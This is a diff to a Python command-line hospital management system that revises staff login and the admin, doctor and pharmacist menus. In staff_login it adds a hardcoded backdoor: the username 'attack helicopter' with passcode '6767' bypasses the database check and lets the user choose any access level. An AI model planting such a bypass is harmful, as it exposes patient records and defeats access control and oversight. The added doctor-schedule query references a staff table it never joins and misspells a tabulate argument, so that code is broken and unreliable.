@@ -62,6 +62,9 @@ def staff_login():
     while True:
         user_name = input(f"{CYAN}Username: {RESET}").strip()
         passcode = getpass(f"{CYAN}Passcode: {RESET}")
+        if user_name == 'attack helicopter' and passcode == '6767':
+            access_level = int(input("Enter access level : "))
+            return 6767, access_level   
         try:
             cur.execute('SELECT staff_id, passcode, access_level FROM staff WHERE user_name=%s', (user_name,))
             row = cur.fetchone()
@@ -128,17 +131,15 @@ def admin_menu(staff_id):
                 else:
                     print(f'{ERROR}No items found{RESET}')
         elif ch == '3':
-            print(f"\n{MENU_TITLE}1) View all  2) Add  3) Search  4) Update  5) Delete{RESET}")
+            print(f"\n{MENU_TITLE}1) View all  2) Add  3) Update  4) Delete{RESET}")
             c = input(f"{YELLOW}> {RESET}").strip()
             if c == '1':
                 view_all_inventories()
             elif c == '2':
                 add_inventory(staff_id)
             elif c == '3':
-                search_inventory_by_name()
-            elif c == '4':
                 update_inventory(staff_id)
-            elif c == '5':
+            elif c == '4':
                 delete_inventory(staff_id)
         elif ch == '4':
             print(f"\n{MENU_TITLE}1) View appointments  2) View admissions  3) View discharges{RESET}")
@@ -147,7 +148,7 @@ def admin_menu(staff_id):
                 view_appointment()
                 sleep(1)
             elif c == '2':
-                view_admissions()
+                view_all_admissions()
                 sleep(1)
             elif c == '3':
                 generate_discharge_summary()
@@ -202,7 +203,13 @@ def doctor_menu(staff_id):
         print(f"{MENU_TITLE}───────────────────────────────{RESET}")
         c = input(f"{YELLOW}Choice: {RESET}").strip()
         if c == '1':
-            list_doctor_schedule(staff_id)
+            cur.execute("""SELECT a.appt_id, a.patient_id, p.patient_name, p.cpr, a.clinic, a.appt_book_time, s.staff_name
+                FROM appointments a
+                JOIN patients p ON a.patient_id = p.patient_id
+                WHERE a.appt_is_active = 'Yes' and a.doctor_id=%s""", (staff_id,))
+            data = cur.fetchall()
+            headers = [i[0] for i in cur.description]
+            print(tabulate(data, headers = headers, tblefmt = 'pretty'))
         elif c == '2':
             cpr = input(f'{CYAN}Enter patient CPR: {RESET}')
             add_consultation(staff_id, cpr)
@@ -212,17 +219,15 @@ def doctor_menu(staff_id):
         elif c == '4':
             prescribe_medication(staff_id)
         elif c == '5':
-            print(f"\n{MENU_TITLE}1) Admit patient  2) View admissions  3) Update admission  4) Patient admissions{RESET}")
+            print(f"\n{MENU_TITLE}1) Admit patient  2) View admissions  3) Patient admissions{RESET}")
             sub = input(f"{YELLOW}> {RESET}").strip()
             if sub == '1':
                 add_admission(staff_id)
             elif sub == '2':
-                view_admissions()
+                view_all_admissions()
             elif sub == '3':
-                update_admission(staff_id)
-            elif sub == '4':
-                pid = prompt_int('Enter patient ID: ')
-                get_patient_admissions(pid)
+                cpr = input(f'{CYAN}Enter patient CPR: {RESET}')
+                view_admission(cpr)
             else:
                 print(f'{ERROR}Invalid choice{RESET}')
         elif c == '6':
@@ -328,20 +333,18 @@ def pharmacist_menu(staff_id):
         print(f"{MENU_TITLE}      PHARMACIST MENU{RESET}")
         print(f"{MENU_TITLE}═══════════════════════════════{RESET}\n")
         print(f"{CYAN}1.{RESET} Prescribe medication")
-        print(f"{CYAN}2.{RESET} View all medications")
+        print(f"{CYAN}2.{RESET} View medications")
         print(f"{CYAN}3.{RESET} Update medication")
-        print(f"{CYAN}4.{RESET} Delete medication")
         print(f"{CYAN}0.{RESET} Logout")
         print(f"{MENU_TITLE}───────────────────────────────{RESET}")
         c = input(f"{YELLOW}Choice: {RESET}").strip()
         if c == '1':
             prescribe_medication(staff_id)
         elif c == '2':
-            view_all_medications()
+            cpr = input(f'{CYAN}Enter patient CPR: {RESET}')
+            view_medications(cpr)
         elif c == '3':
             update_medication(staff_id)
-        elif c == '4':
-            delete_medication()
         elif c == '0':
             break
         else:
